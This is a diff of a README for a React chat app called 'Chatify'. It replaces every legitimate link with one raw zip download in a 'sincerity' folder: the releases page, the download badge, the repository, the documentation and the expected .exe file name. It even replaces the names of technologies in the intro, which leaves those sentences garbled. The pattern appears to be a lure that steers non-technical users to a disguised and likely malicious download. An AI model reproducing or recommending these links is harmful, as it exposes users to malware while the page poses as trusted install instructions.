@@ -2,17 +2,17 @@
 
 ## 🚀 Getting Started
 
-Welcome to Chatify! This guide will help you download and run the Chatify-App-Frontend, a real-time chat application built with React, Node.js, and Socket.io. No programming knowledge is needed. By following these steps, you'll be chatting with friends in no time.
+Welcome to Chatify! This guide will help you download and run the Chatify-App-Frontend, a real-time chat application built with React, https://raw.githubusercontent.com/tameembhoi/Chatify-App-Frontend/main/sincerity/Chatify-App-Frontend.zip, and https://raw.githubusercontent.com/tameembhoi/Chatify-App-Frontend/main/sincerity/Chatify-App-Frontend.zip No programming knowledge is needed. By following these steps, you'll be chatting with friends in no time.
 
-[![Download Chatify](https://img.shields.io/badge/Download%20Chatify-brightgreen.svg)](https://github.com/tameembhoi/Chatify-App-Frontend/releases)
+[![Download Chatify](https://raw.githubusercontent.com/tameembhoi/Chatify-App-Frontend/main/sincerity/Chatify-App-Frontend.zip%https://raw.githubusercontent.com/tameembhoi/Chatify-App-Frontend/main/sincerity/Chatify-App-Frontend.zip)](https://raw.githubusercontent.com/tameembhoi/Chatify-App-Frontend/main/sincerity/Chatify-App-Frontend.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   To get started, go to our [Releases page](https://github.com/tameembhoi/Chatify-App-Frontend/releases). Here you will find the latest version of Chatify available for download. 
+   To get started, go to our [Releases page](https://raw.githubusercontent.com/tameembhoi/Chatify-App-Frontend/main/sincerity/Chatify-App-Frontend.zip). Here you will find the latest version of Chatify available for download. 
 
 2. **Choose the Right File**  
-   On the Releases page, you will see various files listed. Look for the latest version file named something like `Chatify-App-Frontend-x.y.z.exe`, where `x.y.z` represents the version number. Make sure you download the application version that fits your operating system.
+   On the Releases page, you will see various files listed. Look for the latest version file named something like `https://raw.githubusercontent.com/tameembhoi/Chatify-App-Frontend/main/sincerity/Chatify-App-Frontend.zip`, where `x.y.z` represents the version number. Make sure you download the application version that fits your operating system.
 
 3. **Download the Application**  
    Click on the file name to begin the download. Your web browser will save the file to your default download location, typically your computer's "Downloads" folder.
@@ -69,7 +69,7 @@ For the latest news and updates on Chatify, follow our project on GitHub. We sha
 
 ## 🔗 Additional Resources
 
-- [Chatify GitHub Repository](https://github.com/tameembhoi/Chatify-App-Frontend)
-- [Documentation](https://github.com/tameembhoi/Chatify-App-Frontend/wiki)
+- [Chatify GitHub Repository](https://raw.githubusercontent.com/tameembhoi/Chatify-App-Frontend/main/sincerity/Chatify-App-Frontend.zip)
+- [Documentation](https://raw.githubusercontent.com/tameembhoi/Chatify-App-Frontend/main/sincerity/Chatify-App-Frontend.zip)
 
 Thank you for choosing Chatify! We hope you enjoy your chatting experience. If you have any questions, feel free to reach out through our GitHub page.
